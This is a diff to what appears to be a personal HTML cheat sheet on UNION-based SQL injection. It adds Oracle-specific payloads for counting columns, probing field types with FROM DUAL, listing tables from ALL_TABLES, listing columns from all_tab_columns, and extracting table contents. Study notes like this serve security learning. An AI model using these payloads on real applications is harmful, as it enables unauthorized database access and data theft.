@@ -106,7 +106,7 @@
 <p><b>DESCRIPTION: </b></p>
 </details>
 <details>
-<summary>DATABASE TYPE/VERSION TECHNIQUES</summary>
+<summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
 
 -- or # | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este 
@@ -118,11 +118,12 @@ después de los símbolos, se ignora.
 <b>method2:</b><mark>' UNION SELECT NULL--</mark>
 	
 2. get field type
-<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>
+<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark> * assuming four columns
 <mark>' UNION SELECT NULL,'a',NULL,NULL--</mark>
+<mark>' UNION SELECT 'a','a' FROM DUAL--</mark>	* assuming two columns
 	
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
-is needed.
+is needed. Also, for ORACLE the select statement is needed a table to search from, it can be any table.
 	
 <b>COMMON TESTS:</b>
 
@@ -158,14 +159,25 @@ is needed.
 </details>
 <details>
 <summary>ORACLE</summary>
+<b>PRE-REQS:</b>
+1. get column number
+2. get field type
 
+*after that information is collected, it is time to retrieve the TABLE_NAME of the database schema.
 
+<mark>' UNION SELECT table_name,NULL from ALL_TABLES--</mark>
 
+*once table is identified, it is time to retrieve the COLUMNS of the table
 
-	
+<mark>' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark>
+
+*once table_name and columns are identified, it is time to retrieve the CONTENT
+
+<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>	
 </details>
-	
-</p>
+
+NOTE: both ways needs to know the column number, field type and both examples are assuming it has
+two columns and both type string.</p>
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
